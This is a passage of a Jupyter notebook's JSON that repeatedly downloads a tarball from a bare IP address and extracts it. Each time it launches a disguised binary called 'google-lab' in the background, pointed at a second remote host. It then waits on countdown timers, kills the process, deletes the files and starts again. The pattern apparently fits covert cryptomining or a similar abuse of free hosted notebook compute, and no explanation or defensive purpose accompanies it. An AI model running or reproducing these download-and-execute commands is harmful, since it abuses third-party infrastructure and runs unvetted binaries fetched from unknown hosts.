        "id": "xbnufCslfp98"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "AtUIm_TRfqCS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "O7OjqDMefqCS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "QifnEY5pfqCS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "53Qg4ihyfqCS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "oAaFVg-FfqCT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "PElGB7-0fqGw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "R6BF_SX6fqGw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "a60SdfI3fqGw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "55F9naMhfqGw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "14Pp4AbKfqGw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "KF9snO_vfqLF"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "5b3q2jNyfqLF"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "_i3wJleAfqLG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "dRbczoUcfqLG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "gYQ5SjPgfqLG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "QnEZjGQyfqPw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "eUECKmRDfqPw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "oB-lpDGMfqPw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "M5tI7xIcfqPw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "6OSuIMMNfqPw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "ON1WtDssfqW2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "fZFyhG7XfqW2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "bs8Be3w2fqW2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "QF8-ySvBfqW2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "rQrVvVgHfqW2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "HR5dMnerfqdJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "xs9xSjU-fqdJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "ClimWOBofqdJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "spkgwx23fqdJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "XNzksGpjfqdJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "LwThys3ifqk_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "_CdKX9_gfqk_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "eU-M2wxXfqk_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "AvU8Ugptfqk_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "rU3xRh8Vfqk_"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}